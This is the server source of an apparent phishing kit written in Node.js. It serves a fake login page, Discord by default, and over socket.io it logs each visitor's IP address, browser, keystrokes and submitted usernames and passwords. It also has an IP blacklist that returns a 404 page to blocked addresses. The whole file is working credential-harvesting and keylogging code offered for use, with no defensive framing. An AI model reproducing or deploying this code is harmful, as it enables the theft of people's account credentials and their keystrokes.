import express from "express"
import { Server } from "socket.io";
import fs from "fs"
import path from "path"
import http from "http"
import Logger from "./log.js"
import { fileURLToPath } from 'url';

// i found the dirname thing on stackoveflow thanks i guess
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express()
const server = http.createServer(app)
const logger = new Logger()
const io = new Server(server);
let config = {}

try{
  config = JSON.parse(fs.readFileSync("config.json"))
}catch(err){
  logger.error("Error reading 'config.json' | "+ err)
}

logger.config(config)

const template = path.join(
  __dirname, 
  "templates", 
  (config["template"] || "discord")+".html"
)

if(!fs.existsSync(template)){
  logger.error("Template '"+(config["template"] || "discord")+"' not found.")
}

app.use("/static", express.static("static"))

app.all(config["path"] || "/", (req,res)=>{
  if(config["blacklist"] && config.blacklist.includes(req.ip)){
    logger.info("Request from '"+req.ip+"' which is blacklisted, returning with 404")
    return res.status(404).send("404 not found") 
  }
  
  res.sendFile(path.join(
    __dirname, 
    "templates", 
    (config["template"] || "discord")+".html"
  ))
  logger.info("Request from '"+req.ip+"' - accepted")
})

app.all("/ip", (req,res)=>{
  return res.json({ ip: req.ip })
})

app.all("*", (req,res)=>{
  logger.info("404 request from "+req.ip)
  res.status(404).send("404 not found")
})

io.on("connection", socket => { 
    socket.on("info", data =>{
      let log = `IP: ${data["ip"]} BROWSER: ${data["browser"]}`
      socket.ip = data["ip"]
      logger.log("Socket "+socket.ip+" | [INFO]    "+log)
    })

    socket.on("key", data => {
      let log = `ACTIVE: ${data["active"]} KEY: ${data["key"]}`
      logger.log("Socket "+socket.ip+" | [KEYLOG]  "+log)
    })

    socket.on("submit", data => {
      let log = `USER: ${data["user"]} PASS: ${data["pass"]}`
      logger.log("Socket "+socket.ip+" | [SUBMIT]  "+log)
    })
})

server.listen(config["port"] || 8080, () => {
  logger.banner()
  logger.success("Server is listening on port "+server.address().port)
})
